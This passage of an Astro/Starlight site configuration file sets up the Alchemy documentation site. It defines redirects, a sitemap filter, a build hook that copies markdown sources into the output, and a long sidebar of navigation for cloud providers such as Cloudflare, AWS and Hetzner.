import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import mdx from "@astrojs/mdx";
import react from "@astrojs/react";
import sitemap from "@astrojs/sitemap";
import starlight from "@astrojs/starlight";
import tailwindcss from "@tailwindcss/vite";
import type { AstroIntegration } from "astro";
import { defineConfig } from "astro/config";
import { promises as fs } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import starlightBlog from "starlight-blog";
import { buildOutputChecks, noindexPaths } from "./plugins/build-output.ts";
import providersSidebar from "./src/generated/providers-sidebar.json" with { type: "json" };

/**
 * Every provider has a docs hub: its reference tree renders inside the
 * hub's "Resources" group and its reference URLs belong to the hub tab
 * (see docs-tabs.ts). The Reference tab is a directory — its sidebar is
 * just the list of providers, each linking to its hub.
 */
function providersSidebarEntry() {
  return {
    label: "Reference",
    collapsed: false,
    items: [
      { label: "AWS", link: "/aws" },
      { label: "Cloudflare", link: "/cloudflare" },
      { label: "Hetzner", link: "/hetzner" },
      { label: "Fly", link: "/fly" },
      { label: "Railway", link: "/railway" },
      { label: "PlanetScale", link: "/planetscale" },
      { label: "Neon", link: "/neon" },
      { label: "Prisma", link: "/prisma" },
      { label: "Better Auth", link: "/better-auth" },
      { label: "Axiom", link: "/axiom" },
      { label: "GitHub", link: "/github" },
      { label: "Stripe", link: "/stripe" },
      { label: "Docker", link: "/docker" },
      { label: "SQL", link: "/sql" },
      { label: "Command", link: "/command" },
    ],
  };
}

/**
 * A cloud hub's "Resources" section: that provider's slice of the generated
 * reference tree below Guides, expanded one level (categories/services show,
 * everything inside them stays collapsed) so each hub is self-sufficient.
 * A hub that fronts several provider namespaces (e.g. SQL + Drizzle) passes
 * them all and gets one merged Resources group.
 *
 * @param {...string} providers Provider labels / directory names (e.g. "Cloudflare")
 */
function providerResourcesEntry(...providers: string[]) {
  const entryItems = (provider: string) => {
    const group = providersSidebar.find((p) => p.label === provider);
    if (group) return group.items;
    return [
      { autogenerate: { directory: `providers/${provider}`, collapsed: true } },
    ];
  };
  // A single provider's tree is inlined; a multi-namespace hub nests each
  // provider under its own subgroup so same-named resources (SQL.D1 vs
  // Drizzle.D1) stay distinguishable.
  const items =
    providers.length === 1
      ? entryItems(providers[0])
      : providers.map((provider) => ({
          label: provider,
          collapsed: true,
          items: entryItems(provider),
        }));
  return { label: "Resources", collapsed: false, items };
}

/**
 * Copies `src/content/docs/**\/*.{md,mdx}` into the build output dir, preserving
 * the directory layout but normalizing extensions to `.md`. This lets the worker
 * serve raw markdown for clients (e.g. coding agents) that prefer it.
 */
function copyMarkdownSources(): AstroIntegration {
  return {
    name: "copy-markdown-sources",
    hooks: {
      "astro:build:done": async ({ dir }) => {
        const outDir = fileURLToPath(dir);

        /**
         * @param {string} srcDir
         * @param {{ lowercase?: boolean }} [opts]
         * @param {string} [relTo]
         */
        async function walk(
          srcDir: string,
          opts: { lowercase?: boolean } = {},
          relTo: string = srcDir,
        ) {
          let entries;
          try {
            entries = await fs.readdir(srcDir, { withFileTypes: true });
          } catch {
            return;
          }
          // Fan the copies out — thousands of tiny files; serial awaits
          // dominate the hook's runtime otherwise.
          await Promise.all(
            entries.map(async (entry) => {
              const full = path.join(srcDir, entry.name);
              if (entry.isDirectory()) return walk(full, opts, relTo);
              if (!entry.isFile()) return;
              const ext = path.extname(entry.name).toLowerCase();
              if (ext !== ".md" && ext !== ".mdx") return;
              let rel = path.relative(relTo, full);
              rel = rel.slice(0, rel.length - ext.length) + ".md";
              // Starlight lowercases doc URLs (e.g. CamelCase source
              // `providers/AWS/S3/Bucket.md` is served at `/providers/aws/s3/bucket`),
              // so the raw-markdown copy must live at the lowercased path or the
              // worker's `/providers/aws/s3/bucket.md` lookup 404s into HTML.
              if (opts.lowercase) rel = rel.toLowerCase();
              const target = path.join(outDir, rel);
              await fs.mkdir(path.dirname(target), { recursive: true });
              await fs.copyFile(full, target);
            }),
          );
        }

        // Docs (Starlight content collection) — preserves nested layout under
        // /content/docs/ → /<path>.md, lowercased to match Starlight's URLs.
        await walk(
          fileURLToPath(new URL("./src/content/docs/", import.meta.url)),
          { lowercase: true },
        );
        // Marketing pages (top-level Astro pages) — exposes /<page>.md so
        // agents can fetch raw MDX via the worker's content negotiation. Astro
        // page routing preserves case, so don't lowercase these.
        await walk(fileURLToPath(new URL("./src/pages/", import.meta.url)));
      },
    },
  };
}

export default defineConfig({
  site: "https://alchemy.run",
  redirects: {
    "/infrastructure-as-effects": "/what-is-alchemy",
    "/cli/login": "/cli/profile",
    "/drizzle": "/sql",
    "/drizzle/migrations": "/sql/drizzle/migrations",
  },
  prefetch: true,
  trailingSlash: "ignore",
  integrations: [
    react(),
    copyMarkdownSources(),
    buildOutputChecks(),
    sitemap({
      filter: (page) =>
        !page.endsWith(".html") &&
        !page.endsWith(".md") &&
        !page.endsWith(".mdx") &&
        // Anything rendered with a `noindex` robots meta: `/auth/*`, and the
        // example-less API reference stubs (see `collectNoindexPages`).
        !noindexPaths.has(new URL(page).pathname) &&
        // starlight-blog's paginated listings (`/blog/2/`, …) — thin pages
        // that only repeat post excerpts; the posts themselves are listed.
        !/\/blog\/\d+\/?$/.test(page),
    }),
    starlight({
      title: "Alchemy",
      favicon: "/favicon.svg",
      customCss: ["./src/styles/global.css", "./src/styles/custom.css"],
      components: {
        ThemeProvider: "./src/components/ThemeProvider.astro",
        Header: "./src/components/starlight/Header.astro",
        Head: "./src/components/starlight/Head.astro",
        Sidebar: "./src/components/starlight/Sidebar.astro",
      },
      prerender: true,
      social: [
        {
          icon: "github",
          label: "GitHub",
          href: "https://github.com/alchemy-run/alchemy",
        },
        {
          icon: "discord",
          label: "Discord",
          href: "https://discord.gg/jwKw8dBJdN",
        },
      ],
      editLink: {
        baseUrl: "https://github.com/alchemy-run/alchemy/edit/main/website",
      },
      // One top-level group per docs tab (see src/docs-tabs.ts). The
      // docs-tabs-sidebar middleware swaps in the active tab's group, so
      // the rendered sidebar only ever navigates within the current tab.
      sidebar: [
        {
          label: "Core",
          items: [
            { label: "Getting started", link: "/getting-started" },
            { label: "What is Alchemy?", link: "/what-is-alchemy" },
            {
              label: "Infrastructure as Code",
              items: [
                { label: "Stacks", link: "/infrastructure-as-code/stack" },
                {
                  label: "Resources",
                  link: "/infrastructure-as-code/resource",
                },
                { label: "Actions", link: "/infrastructure-as-code/action" },
                {
                  label: "Inputs & Outputs",
                  link: "/infrastructure-as-code/outputs",
                },
                {
                  label: "References",
                  link: "/infrastructure-as-code/references",
                },
                {
                  label: "Resource Lifecycle",
                  link: "/infrastructure-as-code/resource-lifecycle",
                },
                {
                  label: "Renaming Resources",
                  link: "/infrastructure-as-code/renaming",
                },
                {
                  label: "Providers",
                  link: "/infrastructure-as-code/provider",
                },
                {
                  label: "Custom Provider",
                  link: "/infrastructure-as-code/custom-provider",
                },
                {
                  label: "Local Provider",
                  link: "/infrastructure-as-code/local-provider",
                },
              ],
            },
            {
              label: "Infrastructure as Effects",
              items: [
                {
                  label: "Runtime",
                  link: "/infrastructure-as-effects/runtime",
                },
                {
                  label: "Bindings",
                  link: "/infrastructure-as-effects/binding",
                },
                { label: "Layers", link: "/infrastructure-as-effects/layers" },
                {
                  label: "Event Sources",
                  link: "/infrastructure-as-effects/event-sources",
                },
                {
                  label: "Sinks",
                  link: "/infrastructure-as-effects/sinks",
                },
                { label: "Phases", link: "/infrastructure-as-effects/phases" },
                {
                  label: "Circular Bindings",
                  link: "/infrastructure-as-effects/circular-bindings",
                },
                {
                  label: "Telemetry",
                  link: "/infrastructure-as-effects/telemetry",
                },
                {
                  label: "Custom Runtime",
                  link: "/infrastructure-as-effects/custom-runtime",
                },
              ],
            },
            {
              label: "APIs",
              items: [
                {
                  label: "Overview",
                  link: "/apis",
                },
                {
                  label: "Schemaless RPC",
                  link: "/apis/schemaless",
                },
                {
                  label: "Effect RPC",
                  link: "/apis/effect-rpc",
                },
                {
                  label: "Effect HTTP",
                  link: "/apis/effect-http",
                },
              ],
            },
            {
              label: "Environments",
              items: [
                { label: "Stages", link: "/environments/stages" },
                { label: "Profiles", link: "/environments/profiles" },
                {
                  label: "Auth Providers",
                  link: "/environments/auth-providers",
                },
                {
                  label: "Custom Auth Provider",
                  link: "/environments/custom-auth-provider",
                },
                { label: "Secrets & Config", link: "/environments/secrets" },
                {
                  label: "Local development",
                  link: "/environments/local-development",
                },
                { label: "CI", link: "/environments/ci" },
              ],
            },
            {
              label: "State Store",
              items: [
                { label: "State Store", link: "/state-store" },
                {
                  label: "Custom State Store",
                  link: "/state-store/custom-state-store",
                },
              ],
            },
            {
              label: "Project structure",
              items: [
                {
                  label: "File layout",
                  link: "/project-structure/file-layout",
                },
                { label: "Monorepo", link: "/project-structure/monorepo" },
                {
                  label: "Single Stack",
                  link: "/project-structure/monorepo-single-stack",
                },
                {
                  label: "Multiple Stacks",
                  link: "/project-structure/monorepo-multi-stack",
                },
              ],
            },
            {
              label: "Testing & observability",
              items: [
                { label: "Testing", link: "/testing" },
                {
                  label: "Testing a Stack",
                  link: "/testing/testing-a-stack",
                },
                {
                  label: "Testing Providers",
                  link: "/testing/testing-providers",
                },
                { label: "Test harness", link: "/testing/test-harness" },
                { label: "Observability", link: "/testing/observability" },
              ],
            },
          ],
        },
        {
          label: "CLI",
          items: [
            { label: "Overview", link: "/cli" },
            {
              label: "Deploy",
              items: [
                { label: "deploy", link: "/cli/deploy" },
                { label: "plan", link: "/cli/plan" },
                { label: "destroy", link: "/cli/destroy" },
                { label: "drift", link: "/cli/drift" },
                { label: "nuke", link: "/cli/nuke" },
                {
                  label: "Adopting Resources",
                  link: "/cli/adopting-resources",
                },
              ],
            },
            {
              label: "Develop",
              items: [
                { label: "dev", link: "/cli/dev" },
                { label: "logs", link: "/cli/logs" },
              ],
            },
            {
              label: "Auth",
              items: [{ label: "profile", link: "/cli/profile" }],
            },
            {
              label: "State",
              items: [
                { label: "state", link: "/cli/state" },
                {
                  label: "Inspecting State",
                  link: "/cli/inspecting-state",
                },
              ],
            },
            {
              label: "Providers",
              items: [
                { label: "aws", link: "/cli/aws" },
                { label: "cloudflare", link: "/cli/cloudflare" },
              ],
            },
            { label: "Migrating from v1", link: "/migrating-from-v1" },
          ],
        },
        {
          label: "Cloudflare",
          items: [
            { label: "Overview", link: "/cloudflare" },
            { label: "Setup", link: "/cloudflare/setup" },
            {
              label: "Local development",
              link: "/cloudflare/local-development",
            },
            {
              label: "Tutorial",
              items: [{ autogenerate: { directory: "cloudflare/tutorial" } }],
            },
            {
              label: "Compute",
              items: [
                { label: "Workers", link: "/cloudflare/compute/workers" },
                {
                  label: "Gradual deployments",
                  link: "/cloudflare/compute/gradual-deployments",
                },
                {
                  label: "Python Workers",
                  link: "/cloudflare/compute/python-workers",
                },
                { label: "Workers Cache", link: "/cloudflare/compute/cache" },
                {
                  label: "Rate limiting",
                  link: "/cloudflare/compute/rate-limiting",
                },
                {
                  label: "Browser rendering",
                  link: "/cloudflare/compute/browser-rendering",
                },
                {
                  label: "Worker Loader",
                  link: "/cloudflare/compute/worker-loader",
                },
                {
                  label: "Workers for Platforms",
                  link: "/cloudflare/compute/workers-for-platforms",
                },
                {
                  label: "Durable Objects",
                  link: "/cloudflare/compute/durable-objects",
                },
                {
                  label: "Cross-worker DOs",
                  link: "/cloudflare/compute/cross-worker-durable-object",
                },
                {
                  label: "WebSockets",
                  link: "/cloudflare/compute/hibernatable-websockets",
                },
                { label: "Containers", link: "/cloudflare/compute/containers" },
                { label: "Workflows", link: "/cloudflare/compute/workflows" },
              ],
            },
            {
              label: "Frontend",
              items: [
                {
                  label: "Overview",
                  link: "/cloudflare/frontend/frontends",
                },
                { label: "Astro", link: "/cloudflare/frontend/astro" },
                { label: "Foldkit", link: "/cloudflare/frontend/foldkit" },
                {
                  label: "Full-stack RPC + Drizzle",
                  link: "/cloudflare/frontend/full-stack-tanstack-rpc-drizzle",
                },
                { label: "Next.js", link: "/cloudflare/frontend/nextjs" },
                { label: "Nuxt", link: "/cloudflare/frontend/nuxt" },
                { label: "Octane", link: "/cloudflare/frontend/octane" },
                {
                  label: "React Router",
                  link: "/cloudflare/frontend/react-router",
                },
                { label: "React SPA", link: "/cloudflare/frontend/vite-spa" },
                {
                  label: "SolidStart",
                  link: "/cloudflare/frontend/solidstart",
                },
                {
                  label: "Static sites",
                  link: "/cloudflare/frontend/static-site",
                },
                {
                  label: "SvelteKit",
                  link: "/cloudflare/frontend/sveltekit",
                },
                {
                  label: "TanStack Start",
                  link: "/cloudflare/frontend/tanstack-start",
                },
                { label: "Vite", link: "/cloudflare/frontend/vite" },
                { label: "Vue", link: "/cloudflare/frontend/vue" },
                { label: "Waku", link: "/cloudflare/frontend/waku" },
              ],
            },
            {
              label: "APIs",
              items: [
                {
                  label: "Schemaless RPC",
                  link: "/cloudflare/apis/schemaless-rpc",
                },
                { label: "Effect RPC", link: "/cloudflare/apis/effect-rpc" },
                {
                  label: "Effect HTTP",
                  link: "/cloudflare/apis/effect-http-api",
                },
              ],
            },
            {
              label: "Data",
              items: [
                { label: "D1", link: "/cloudflare/data/d1" },
                { label: "KV", link: "/cloudflare/data/kv" },
                { label: "R2", link: "/cloudflare/data/r2" },
                { label: "Hyperdrive", link: "/cloudflare/data/hyperdrive" },
                { label: "Drizzle ORM", link: "/cloudflare/data/drizzle" },
                { label: "Drizzle on D1", link: "/cloudflare/data/d1-drizzle" },
                {
                  label: "Shared database",
                  link: "/cloudflare/data/shared-database",
                },
                {
                  label: "Branch from a shared database",
                  link: "/cloudflare/data/branch-from-shared-database",
                },
                { label: "Artifacts", link: "/cloudflare/data/artifacts" },
              ],
            },
            {
              label: "Messaging & events",
              items: [
                { label: "Queues", link: "/cloudflare/messaging/queues" },
                { label: "Cron triggers", link: "/cloudflare/messaging/cron" },
                {
                  label: "GitHub events",
                  link: "/cloudflare/messaging/github-events",
                },
              ],
            },
            {
              label: "Email",
              items: [
                { label: "Email", link: "/cloudflare/email" },
                {
                  label: "Send & receive email",
                  link: "/cloudflare/email/send-and-receive",
                },
              ],
            },
            {
              label: "AI",
              items: [
                { label: "Workers AI", link: "/cloudflare/ai/workers-ai" },
                { label: "AI Gateway", link: "/cloudflare/ai/ai-gateway" },
                {
                  label: "AI Search (AutoRAG)",
                  link: "/cloudflare/ai/ai-search",
                },
                { label: "Effect AI", link: "/cloudflare/ai/effect-ai" },
                { label: "Vectorize", link: "/cloudflare/ai/vectorize" },
                {
                  label: "Release agent",
                  link: "/cloudflare/ai/release-agent",
                },
              ],
            },
            {
              label: "Security & secrets",
              items: [
                {
                  label: "Secrets & env",
                  link: "/cloudflare/security/secrets-env",
                },
                {
                  label: "Secrets Store",
                  link: "/cloudflare/security/secrets-store",
                },
                { label: "Turnstile", link: "/cloudflare/security/turnstile" },
              ],
            },
            {
              label: "Observability",
              items: [
                {
                  label: "Native tracing",
                  link: "/cloudflare/observability/workers-tracing",
                },
                {
                  label: "Axiom telemetry",
                  link: "/cloudflare/observability/axiom-observability",
                },
                {
                  label: "Analytics Engine",
                  link: "/cloudflare/observability/analytics-engine",
                },
              ],
            },
            {
              label: "Networking",
              items: [
                {
                  label: "Domains & DNS",
                  link: "/cloudflare/networking/domains",
                },
                {
                  label: "Custom domains & routes",
                  link: "/cloudflare/networking/custom-domains",
                },
                { label: "Tunnel", link: "/cloudflare/networking/tunnel" },
              ],
            },
            providerResourcesEntry("Cloudflare"),
          ],
        },
        {
          label: "AWS",
          items: [
            { label: "Overview", link: "/aws" },
            { label: "Setup", link: "/aws/setup" },
            { label: "Local development", link: "/aws/local-development" },
            {
              label: "Tutorial",
              items: [{ autogenerate: { directory: "aws/tutorial" } }],
            },
            {
              label: "Compute",
              items: [
                {
                  label: "Choosing a runtime",
                  link: "/aws/compute/choosing-a-runtime",
                },
                { label: "Lambda", link: "/aws/compute/lambda" },
                { label: "ECS", link: "/aws/compute/ecs" },
                { label: "EC2", link: "/aws/compute/ec2" },
                { label: "EKS", link: "/aws/compute/eks" },
                { label: "HyperPod", link: "/aws/compute/hyperpod" },
                { label: "Lambda MicroVMs", link: "/aws/compute/microvms" },
              ],
            },
            {
              label: "Frontend",
              items: [
                {
                  label: "Overview",
                  link: "/aws/frontend/websites",
                },
                { label: "Astro", link: "/aws/frontend/astro" },
                { label: "Foldkit", link: "/aws/frontend/foldkit" },
                {
                  label: "Full-stack RPC + Drizzle",
                  link: "/aws/frontend/full-stack-tanstack-rpc-drizzle",
                },
                { label: "Next.js", link: "/aws/frontend/nextjs" },
                { label: "Nuxt", link: "/aws/frontend/nuxt" },
                { label: "Octane", link: "/aws/frontend/octane" },
                {
                  label: "React Router",
                  link: "/aws/frontend/react-router",
                },
                { label: "React SPA", link: "/aws/frontend/vite-spa" },
                {
                  label: "SolidStart",
                  link: "/aws/frontend/solidstart",
                },
                {
                  label: "Static sites",
                  link: "/aws/frontend/static-site",
                },
                {
                  label: "SvelteKit",
                  link: "/aws/frontend/sveltekit",
                },
                {
                  label: "TanStack Start",
                  link: "/aws/frontend/tanstack-start",
                },
                { label: "Vite", link: "/aws/frontend/vite" },
                { label: "Vue", link: "/aws/frontend/vue" },
                { label: "Waku", link: "/aws/frontend/waku" },
              ],
            },
            {
              label: "APIs",
              items: [
                {
                  label: "Schemaless RPC",
                  link: "/aws/apis/schemaless-rpc",
                },
                { label: "Effect RPC", link: "/aws/apis/effect-rpc" },
                {
                  label: "Effect HTTP",
                  link: "/aws/apis/effect-http-api",
                },
                { label: "API Gateway", link: "/aws/apis/api-gateway" },
              ],
            },
            {
              label: "Data",
              items: [
                { label: "DynamoDB", link: "/aws/data/dynamodb" },
                { label: "S3", link: "/aws/data/s3" },
                { label: "RDS & Aurora", link: "/aws/data/rds" },
              ],
            },
            {
              label: "AI",
              items: [
                { label: "Bedrock & Effect AI", link: "/aws/ai/bedrock" },
              ],
            },
            {
              label: "Messaging & events",
              items: [
                { label: "SQS", link: "/aws/messaging/sqs" },
                { label: "SNS", link: "/aws/messaging/sns" },
                { label: "Kinesis", link: "/aws/messaging/kinesis" },
                {
                  label: "EventBridge & Scheduler",
                  link: "/aws/messaging/eventbridge",
                },
                {
                  label: "DynamoDB Streams",
                  link: "/aws/messaging/dynamodb-streams",
                },
                { label: "S3 events", link: "/aws/messaging/s3-events" },
              ],
            },
            {
              label: "Email",
              items: [
                {
                  label: "Sending & managing email",
                  link: "/aws/email/sending",
                },
                {
                  label: "Receiving inbound email",
                  link: "/aws/email/receiving",
                },
              ],
            },
            {
              label: "Security & secrets",
              items: [
                { label: "Secrets & env", link: "/aws/security/secrets-env" },
              ],
            },
            {
              label: "Observability",
              items: [
                { label: "CloudWatch", link: "/aws/observability/cloudwatch" },
              ],
            },
            {
              label: "Networking",
              items: [
                { label: "VPC & networking", link: "/aws/networking" },
                {
                  label: "Custom domains",
                  link: "/aws/networking/custom-domains",
                },
              ],
            },
            providerResourcesEntry("AWS"),
          ],
        },
        {
          label: "Hetzner",
          items: [
            { label: "Overview", link: "/hetzner" },
            { label: "Setup", link: "/hetzner/setup" },
            {
              label: "Tutorial",
              items: [{ autogenerate: { directory: "hetzner/tutorial" } }],
            },
            {
              label: "Frontend",
              items: [
                {
                  label: "Overview",
                  link: "/hetzner/frontend/websites",
                },
                { label: "Astro", link: "/hetzner/frontend/astro" },
                { label: "Foldkit", link: "/hetzner/frontend/foldkit" },
                { label: "Next.js", link: "/hetzner/frontend/nextjs" },
                { label: "Nuxt", link: "/hetzner/frontend/nuxt" },
                { label: "Octane", link: "/hetzner/frontend/octane" },
                {
                  label: "React Router",
                  link: "/hetzner/frontend/react-router",
                },
                {
                  label: "SolidStart",
                  link: "/hetzner/frontend/solidstart",
                },
                {
                  label: "Static sites",
                  link: "/hetzner/frontend/static-site",
                },
                {
                  label: "SvelteKit",
                  link: "/hetzner/frontend/sveltekit",
                },
                {
                  label: "TanStack Start",
                  link: "/hetzner/frontend/tanstack-start",
                },
                { label: "Vite", link: "/hetzner/frontend/vite" },
                { label: "Vocs", link: "/hetzner/frontend/vocs" },
                { label: "Waku", link: "/hetzner/frontend/waku" },
              ],
            },
            {
              label: "Compute",
              items: [
                { label: "Servers", link: "/hetzner/compute/servers" },
                { label: "Services", link: "/hetzner/compute/services" },
              ],
            },
            {
              label: "Data",
              items: [{ label: "Volumes", link: "/hetzner/data/volumes" }],
            },
            {
              label: "Networking",
              items: [
                { label: "Networking", link: "/hetzner/networking" },
                { label: "DNS", link: "/hetzner/networking/dns" },
              ],
            },
            providerResourcesEntry("Hetzner"),
          ],
        },
        {
          label: "Fly",
          items: [
            { label: "Overview", link: "/fly" },
            { label: "Setup", link: "/fly/setup" },
            {
              label: "Tutorial",
              items: [{ autogenerate: { directory: "fly/tutorial" } }],
            },
            {
              label: "Frontend",
              items: [
                {
                  label: "Overview",
                  link: "/fly/frontend/websites",
                },
                { label: "Astro", link: "/fly/frontend/astro" },
                { label: "Foldkit", link: "/fly/frontend/foldkit" },
                { label: "Next.js", link: "/fly/frontend/nextjs" },
                { label: "Nuxt", link: "/fly/frontend/nuxt" },
                { label: "Octane", link: "/fly/frontend/octane" },
                {
                  label: "React Router",
                  link: "/fly/frontend/react-router",
                },
                {
                  label: "SolidStart",
                  link: "/fly/frontend/solidstart",
                },
                {
                  label: "Static sites",
                  link: "/fly/frontend/static-site",
                },
                {
                  label: "SvelteKit",
                  link: "/fly/frontend/sveltekit",
                },
                {
                  label: "TanStack Start",
                  link: "/fly/frontend/tanstack-start",
                },
                { label: "Vite", link: "/fly/frontend/vite" },
                { label: "Vocs", link: "/fly/frontend/vocs" },
                { label: "Waku", link: "/fly/frontend/waku" },
              ],
            },
            {
              label: "Compute",
              items: [
                { label: "Apps", link: "/fly/compute/apps" },
                { label: "Machines", link: "/fly/compute/machines" },
                { label: "Services", link: "/fly/compute/services" },
                { label: "Sprites", link: "/fly/compute/sprites" },
                { label: "Regions", link: "/fly/compute/regions" },
              ],
            },
            {
              label: "Data",
              items: [
                { label: "Volumes", link: "/fly/data/volumes" },
                { label: "Postgres", link: "/fly/data/postgres" },
                { label: "Redis", link: "/fly/data/redis" },
                { label: "Tigris", link: "/fly/data/tigris" },
                { label: "Secrets", link: "/fly/data/secrets" },
              ],
            },
            {
              label: "Networking",
              items: [{ label: "IPs & certificates", link: "/fly/networking" }],
            },
            providerResourcesEntry("Fly"),
          ],
        },
        {
          label: "Railway",
          items: [
            { label: "Overview", link: "/railway" },
            { label: "Setup", link: "/railway/setup" },
            {
              label: "Tutorial",
              items: [{ autogenerate: { directory: "railway/tutorial" } }],
            },
            {
              label: "Frontend",
              items: [
                {
                  label: "Overview",
                  link: "/railway/frontend/websites",
                },
                { label: "Astro", link: "/railway/frontend/astro" },
                { label: "Foldkit", link: "/railway/frontend/foldkit" },
                { label: "Next.js", link: "/railway/frontend/nextjs" },
                { label: "Nuxt", link: "/railway/frontend/nuxt" },
                { label: "Octane", link: "/railway/frontend/octane" },
                {
                  label: "React Router",
                  link: "/railway/frontend/react-router",
                },
                {
                  label: "SolidStart",
                  link: "/railway/frontend/solidstart",
                },
                {
                  label: "Static sites",
                  link: "/railway/frontend/static-site",
                },
                {
                  label: "SvelteKit",
                  link: "/railway/frontend/sveltekit",
                },
                {
                  label: "TanStack Start",
                  link: "/railway/frontend/tanstack-start",
                },
                { label: "Vite", link: "/railway/frontend/vite" },
                { label: "Vocs", link: "/railway/frontend/vocs" },
                { label: "Waku", link: "/railway/frontend/waku" },
              ],
            },
            {
              label: "Compute",
              items: [
                { label: "Projects", link: "/railway/compute/projects" },
                { label: "Services", link: "/railway/compute/services" },
                {
                  label: "Functions, templates & VMs",
                  link: "/railway/compute/functions",
                },
                {
                  label: "Environments",
                  link: "/railway/compute/environments",
                },
                { label: "Regions", link: "/railway/compute/regions" },
              ],
            },
            {
              label: "Data",
              items: [
                { label: "Volumes", link: "/railway/data/volumes" },
                { label: "Postgres", link: "/railway/data/postgres" },
                { label: "MySQL", link: "/railway/data/mysql" },
                { label: "Mongo", link: "/railway/data/mongo" },
                { label: "Redis", link: "/railway/data/redis" },
                { label: "Variables", link: "/railway/data/variables" },
                { label: "Buckets", link: "/railway/data/buckets" },
              ],
            },
            {
              label: "Networking",
              items: [
                {
                  label: "Custom domains, TCP & private networks",
                  link: "/railway/networking",
                },
              ],
            },
            providerResourcesEntry("Railway"),
          ],
        },
        {
          label: "PlanetScale",
          items: [
            { label: "Overview", link: "/planetscale" },
            { label: "Setup", link: "/planetscale/setup" },
            {
              label: "Data",
              items: [
                { label: "Postgres", link: "/planetscale/data/postgres" },
                { label: "MySQL", link: "/planetscale/data/mysql" },
                { label: "Migrations", link: "/planetscale/data/migrations" },
                { label: "Credentials", link: "/planetscale/data/credentials" },
                { label: "Backups", link: "/planetscale/data/backups" },
              ],
            },
            {
              label: "Guides",
              items: [
                {
                  label: "Preview branches per PR",
                  link: "/planetscale/guides/preview-branches",
                },
                {
                  label: "Drizzle ORM",
                  link: "/planetscale/guides/drizzle",
                },
              ],
            },
            providerResourcesEntry("Planetscale"),
          ],
        },
        {
          label: "Neon",
          items: [
            { label: "Overview", link: "/neon" },
            { label: "Setup", link: "/neon/setup" },
            {
              label: "Data",
              items: [
                { label: "Branching", link: "/neon/data/branching" },
                { label: "Connections", link: "/neon/data/connections" },
                { label: "Migrations", link: "/neon/data/migrations" },
              ],
            },
            {
              label: "Guides",
              items: [
                {
                  label: "Preview branches per PR",
                  link: "/neon/guides/preview-branches",
                },
                { label: "Drizzle ORM", link: "/neon/guides/drizzle" },
              ],
            },
            providerResourcesEntry("Neon"),
          ],
        },
        {
          label: "Prisma",
          items: [
            { label: "Overview", link: "/prisma" },
            { label: "Setup", link: "/prisma/setup" },
            {
              label: "Data",
              items: [
                { label: "Postgres", link: "/prisma/data/postgres" },
                { label: "Branches", link: "/prisma/data/branches" },
                { label: "Connections", link: "/prisma/data/connections" },
                { label: "Buckets", link: "/prisma/data/buckets" },
              ],
            },
            {
              label: "Compute",
              items: [
                { label: "Apps", link: "/prisma/compute/apps" },
                { label: "Deployments", link: "/prisma/compute/deployments" },
              ],
            },
            {
              label: "Guides",
              items: [
                {
                  label: "Connect from Workers",
                  link: "/prisma/guides/cloudflare-workers",
                },
              ],
            },
            providerResourcesEntry("Prisma"),
          ],
        },
        {
          label: "Stripe",
          items: [
            { label: "Overview", link: "/stripe" },
            { label: "Setup", link: "/stripe/setup" },
            {
              label: "Guides",
              items: [
                {
                  label: "Sell a subscription",
                  link: "/stripe/guides/subscriptions",
                },
                {
                  label: "Onboard merchants with Connect",
                  link: "/stripe/guides/connect",
                },
                {
                  label: "React to Stripe events",
                  link: "/stripe/guides/webhooks",
                },
              ],
            },
            providerResourcesEntry("Stripe"),
          ],
        },
        {
          label: "Better Auth",
          items: [
            { label: "Overview", link: "/better-auth" },
            { label: "Database layers", link: "/better-auth/database-layers" },
            { label: "Migrations", link: "/better-auth/migrations" },
            providerResourcesEntry("BetterAuth"),
          ],
        },
        {
          label: "Axiom",
          items: [
            { label: "Overview", link: "/axiom" },
            { label: "Setup", link: "/axiom/setup" },
            {
              label: "Data",
              items: [
                { label: "Datasets & ingest", link: "/axiom/data/ingest" },
              ],
            },
            {
              label: "Guides",
              items: [
                { label: "Alerting", link: "/axiom/guides/alerting" },
                { label: "Dashboards", link: "/axiom/guides/dashboards" },
                { label: "Annotations", link: "/axiom/guides/annotations" },
              ],
            },
            providerResourcesEntry("Axiom"),
          ],
        },
        {
          label: "GitHub",
          items: [
            { label: "Overview", link: "/github" },
            { label: "Setup", link: "/github/setup" },
            { label: "Repositories", link: "/github/repository" },
            {
              label: "Actions secrets & variables",
              link: "/github/actions-config",
            },
            { label: "Webhooks & events", link: "/github/events" },
            providerResourcesEntry("GitHub"),
          ],
        },
        {
          label: "Git",
          items: [
            { label: "Overview", link: "/git" },
            { label: "Getting Started", link: "/git/getting-started" },
            {
              label: "Tutorial",
              items: [
                {
                  label: "Part 1: Push your first repository",
                  link: "/git/tutorial/part-1",
                },
                {
                  label: "Part 2: Control access",
                  link: "/git/tutorial/part-2",
                },
                {
                  label: "Part 3: Publish a repository",
                  link: "/git/tutorial/part-3",
                },
                {
                  label: "Part 4: Give users their own credentials",
                  link: "/git/tutorial/part-4",
                },
                {
                  label: "Part 5: Add your application's API",
                  link: "/git/tutorial/part-5",
                },
                {
                  label: "Part 6: Protect a branch",
                  link: "/git/tutorial/part-6",
                },
              ],
            },
            {
              label: "Using your host",
              items: [
                { label: "Cloning & pushing", link: "/git/clone-and-push" },
                { label: "Repositories", link: "/git/repositories" },
                { label: "Pull requests", link: "/git/pull-requests" },
                {
                  label: "GitHub API compatibility",
                  link: "/git/github-api",
                },
              ],
            },
            {
              label: "Building blocks",
              items: [
                { label: "Overview", link: "/git/blocks" },
                { label: "HTTP routes", link: "/git/blocks/server" },
                { label: "Engine operations", link: "/git/blocks/engine" },
                { label: "Repository", link: "/git/blocks/repositories" },
                { label: "Registry", link: "/git/blocks/registry" },
                { label: "Blob Store", link: "/git/blocks/blob-store" },
                { label: "Hasher", link: "/git/blocks/hasher" },
                { label: "Auth", link: "/git/blocks/auth" },
              ],
            },
            {
              label: "Recipes",
              items: [
                { label: "Overview", link: "/git/recipes" },
                { label: "Scaling", link: "/git/recipes/scaling" },
                { label: "All on Cloudflare", link: "/git/recipes/cloudflare" },
                {
                  label: "Bytes in S3, hashing on Lambda",
                  link: "/git/recipes/cloudflare-aws",
                },
                {
                  label: "Bring your own store",
                  link: "/git/recipes/your-own-store",
                },
              ],
            },
          ],
        },
        {
          label: "Docker",
          items: [
            { label: "Overview", link: "/docker" },
            { label: "Setup", link: "/docker/setup" },
            { label: "Run local services", link: "/docker/local-services" },
            { label: "Build & push images", link: "/docker/build-and-push" },
            providerResourcesEntry("Docker"),
          ],
        },
        {
